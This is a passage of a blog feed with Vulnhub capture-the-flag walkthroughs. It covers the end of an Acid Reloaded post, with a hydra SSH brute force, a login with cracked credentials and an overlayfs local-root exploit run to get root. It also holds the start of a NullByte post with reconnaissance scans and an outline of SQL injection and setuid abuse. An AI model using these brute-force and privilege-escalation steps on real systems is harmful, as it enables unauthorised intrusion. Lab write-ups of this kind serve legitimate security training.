+</span><span class='line'>&lt;a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#97;&#x63;&#105;&#100;&#x2e;&#101;&#x78;&#112;&#108;&#111;&#x69;&#x74;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109;">&#97;&#99;&#x69;&#100;&#x2e;&#101;&#120;&#112;&#108;&#111;&#x69;&#116;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;&lt;/a>
+</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
+</span><span class='line'>Hydra v8.1 &copy; 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) starting at 2015-09-11 08:49:26
+</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort&hellip;
+</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
+</span><span class='line'>[DATA] attacking service ssh on port 22
+</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
+</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
+</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
+</span><span class='line'>Hydra (&lt;a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra&lt;/a>) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Login to the SSH with makke&rsquo;s login
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh &lt;a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#109;&#97;&#x6b;&#107;&#x65;&#x40;&#49;&#x30;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#49;&#x33;&#x39;">&#109;&#97;&#x6b;&#x6b;&#x65;&#64;&#x31;&#x30;&#x2e;&#49;&#x2e;&#x31;&#46;&#x31;&#51;&#57;&lt;/a>
+</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
+</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
+</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
+</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
+</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Wanna Knock me out ???
+</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x6d;&#97;&#x6b;&#107;&#x65;&#x40;&#x31;&#48;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#x31;&#51;&#57;">&#109;&#97;&#107;&#107;&#101;&#x40;&#49;&#48;&#x2e;&#49;&#x2e;&#x31;&#46;&#x31;&#x33;&#57;&lt;/a>&rsquo;s password:
+</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Documentation:  &lt;a href="https://help.ubuntu.com/">https://help.ubuntu.com/&lt;/a>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p>134 packages can be updated.
+</span><span class='line'>80 updates are security updates.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
+</span><span class='line'>makke@acid:~$ id
+</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
+</span><span class='line'>makke@acid:~$ ifconfig
+</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3&lt;br/>
+</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
+</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
+</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:1000
+</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
+</span><span class='line'>          Interrupt:19 Base address:0x2000&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>lo        Link encap:Local Loopback&lt;br/>
+</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
+</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
+</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class='line'>          collisions:0 txqueuelen:0
+</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>makke@acid:~$</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Poking around and found clues in file <code>.bash_history</code></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
+</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
+</span><span class='line'>makke@acid:~$ ls -ahl
+</span><span class='line'>total 32K
+</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
+</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
+</span><span class='line'>-rw&mdash;&mdash;- 1 makke makke  272 Sep 10 17:13 .bash_history
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  220 Aug 24 19:11 .bash_logout
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke 3.7K Aug 24 19:11 .bashrc
+</span><span class='line'>drwx&mdash;&mdash; 2 makke makke 4.0K Aug 24 21:25 .cache
+</span><span class='line'>-rw-rw-r&ndash; 1 makke makke   40 Aug 24 21:28 .hint
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 makke makke  675 Aug 24 19:11 .profile
+</span><span class='line'>makke@acid:~$ cat .bash_history
+</span><span class='line'>exit
+</span><span class='line'>cd ..
+</span><span class='line'>clear
+</span><span class='line'>cd /
+</span><span class='line'>ls
+</span><span class='line'>cd bin/
+</span><span class='line'>clear
+</span><span class='line'>./overlayfs
+</span><span class='line'>clear
+</span><span class='line'>cd /home/makke/
+</span><span class='line'>clear
+</span><span class='line'>nano .hint
+</span><span class='line'>clear
+</span><span class='line'>ls
+</span><span class='line'>clear
+</span><span class='line'>ls
+</span><span class='line'>ls -a
+</span><span class='line'>cat .hint
+</span><span class='line'>clear
+</span><span class='line'>cd /bin/
+</span><span class='line'>ls
+</span><span class='line'>./overlayfs
+</span><span class='line'>clear
+</span><span class='line'>wgt
+</span><span class='line'>wget
+</span><span class='line'>apt-get remove wget
+</span><span class='line'>su
+</span><span class='line'>su -
+</span><span class='line'>exit
+</span><span class='line'>id
+</span><span class='line'>pwd
+</span><span class='line'>ls
+</span><span class='line'>ls -l
+</span><span class='line'>pwd
+</span><span class='line'>ls -alh
+</span><span class='line'>cat .bash_history
+</span><span class='line'>/bin/overlayfs
+</span><span class='line'>exit
+</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure></p>
+
+<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs
+</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure></p>
+
+<p>run it and ROOT!</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs
+</span><span class='line'>spawning threads
+</span><span class='line'>mount #1
+</span><span class='line'>mount #2
+</span><span class='line'>child threads done
+</span><span class='line'>/etc/ld.so.preload created
+</span><span class='line'>creating shared library&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>id&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>uid=0(root) gid=0(root) groups=0(root),1001(makke)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cd root&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>sh: 2: cd: can&rsquo;t cd to root&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cd /root&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>ls -al&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>total 68
+</span><span class='line'>drwx&mdash;&mdash;  5 root root  4096 Aug 24 21:32 .
+</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root 23934 Aug 24 22:25 .bash_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  3135 Aug  8 18:02 .bashrc
+</span><span class='line'>drwx&mdash;&mdash;  2 root root  4096 Aug 24 17:46 .cache
+</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 17:55 .config
+</span><span class='line'>drwx&mdash;&mdash;  3 root root  4096 Aug  6 15:51 .dbus
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   284 Aug 24 20:57 .flag.txt
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root  2775 Aug 24 21:32 .mysql_history
+</span><span class='line'>-rw&mdash;&mdash;-  1 root root   147 Aug 24 23:32 .nano_history
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   140 Feb 20  2014 .profile
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root    66 Aug  6 17:31 .selected_editor&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cat .flag.txt&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>You have completed the Challenge Successfully.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Your Flag is : &ldquo;Black@Current@Ice-Cream&rdquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>-ACiD&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Twitter:&lt;a href="https://twitter.com/m_avinash143">https://twitter.com/m_avinash143&lt;/a>
+</span><span class='line'>Facebook: &lt;a href="https://www.facebook.com/M.avinash143">https://www.facebook.com/M.avinash143&lt;/a>
+</span><span class='line'>LinkedIN: &lt;a href="https://in.linkedin.com/pub/avinash-thapa/101/406/4b5">https://in.linkedin.com/pub/avinash-thapa/101/406/4b5&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Done!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[[Vulnhub]NullByte: 1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/"/>
+    <updated>2015-08-18T09:12:46-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1</id>
+    <content type="html"><![CDATA[<p><strong>NullByte challenge 0x01</strong></p>
+
+<p>Difficulty is Basic to intermediate.</p>
+
+<p>&ldquo;Use your lateral thinking skills, maybe you’ll need to write some code.&rdquo; &ndash; <a href="http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/">ly0n</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a>.</p>
+
+<!-- more -->
+
+
+<p><img class="left" src="/downloads/nullbyte1/main.png"></p>
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.130/24</em>)</p>
+
+<p>Target: NullByte: 1 (<em>10.10.10.134/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Found hidden information in picture and open the hidden path</li>
+<li>Weak passwords used in Web login form, the password can be found by brute-force attacking</li>
+<li>SQL injection vulnerability found in username searching page</li>
+<li>Exploit SQL injection vulnerability to get user credentials, also can get a limited shell</li>
+<li>Found user ramses with Base64 encoded MD5 password which can be cracked easily and SSH login as ramses</li>
+<li>Mis-configuration program which has setuid set and did not use full path inside of system call. Exploit it to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
+<li>Brute force scan to find hidden path [<font color="FF8000">dirb</font>]</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Download picture from index.html and reveal the hidden information stored in it</li>
+<li>Found the hidden folder and a login page which has comment saying that the password is simple</li>
+<li>Use hydra with rockyou.txt to burte force crack the login password [<font color="FF8000">THC Hydra</font>]</li>
+<li>The next username searching page is SQL injection vulnerable, exploit it to downlaod system sensitive file, login credentials and also get a limited shell [<font color="FF8000">sqlmap</font>]</li>
+<li>Crack user ramses&rsquo;s password and ssh login to get a better shell</li>
+<li>System enumeration and Exploit vulnerable program with setuid bit set to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="http://dirb.sourceforge.net/">dirb</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="http://sqlmap.org/">sqlmap</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.134 in this case).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo netdiscover -r 10.1.1.0/24
+</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p> 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;h2>   IP            At MAC Address      Count  Len   MAC Vendor                   &lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p> 10.1.1.1        00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                &lt;br/>
+</span><span class='line'> 10.1.1.2        00:50:56:fd:d1:6b    01    060   VMWare, Inc.                                                                                                &lt;br/>
+</span><span class='line'> 10.1.1.134      00:0c:29:e1:e0:98    01    060   VMware, Inc.                                                                                            &lt;br/>
+</span><span class='line'> 10.1.1.254      00:50:56:ee:31:18    01    060   VMWare, Inc. &lt;br/></span></code></pre></td></tr></table></div></figure></p>
+
+<p>10.10.10.134 is our Target!</p>
+
+<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>F4l13n@kali:~$ sudo us -H -msf -Iv -p 1-65535 10.1.1.134
+</span><span class='line'>listener statistics 147984 packets recieved 0 packets droped and 0 interface drops
+</span><span class='line'>TCP open                http[   80]     from 10.1.1.134  ttl 64
+</span><span class='line'>TCP open              sunrpc[  111]     from 10.1.1.134  ttl 64
+</span><span class='line'>TCP open      multiling-http[  777]     from 10.1.1.134  ttl 64
+</span><span class='line'>TCP open             unknown[32942]     from 10.1.1.134  ttl 64</span></code></pre></td></tr></table></div></figure></p>
+
+<p>From the result above, TCP port 80, 111, 777 and 32942 have been discovered.</p>
+
+<p>Then I run NMAP scan to probe more detail information for the four opening ports.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Nmap 6.49BETA4 scan initiated Mon Aug 17 07:06:13 2015 as: nmap -v -sV -O -A -T4 -p 80,111,777,32942 -oN NullByte_nmap.txt 10.1.1.134&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Nmap scan report for 10.1.1.134
+</span><span class='line'>Host is up (0.00044s latency).
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
+</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Debian)
+</span><span class='line'>|&lt;em>http-title: Null Byte 00 - level 1
+</span><span class='line'>111/tcp   open  rpcbind 2-4 (RPC #100000)
+</span><span class='line'>| rpcinfo:
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>|   100024  1          32942/tcp  status
+</span><span class='line'>|&lt;/em>  100024  1          47213/udp  status
+</span><span class='line'>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+</span><span class='line'>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+</span><span class='line'>|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+</span><span class='line'>32942/tcp open  status  1 (RPC #100024)
+</span><span class='line'>MAC Address: 00:0C:29:E1:E0:98 (VMware)
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.2 - 3.19
+</span><span class='line'>Uptime guess: 0.029 days (since Mon Aug 17 06:25:06 2015)
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>TCP Sequence Prediction: Difficulty=264 (Good luck!)
+</span><span class='line'>IP ID Sequence Generation: All zeros
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.44 ms 10.1.1.134&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>Nmap done at Mon Aug 17 07:06:29 2015 &ndash; 1 IP address (1 host up) scanned in 16.18 seconds&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>I found that the port 777 is running SSH and apache 2.4.10 is running on port 80, and the server is Debian Linux with 3.x kernel.</p>
+
+<p>Then I use <code>nikto</code> to scan if any known vulnerabilty can be found which will be a life saver.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
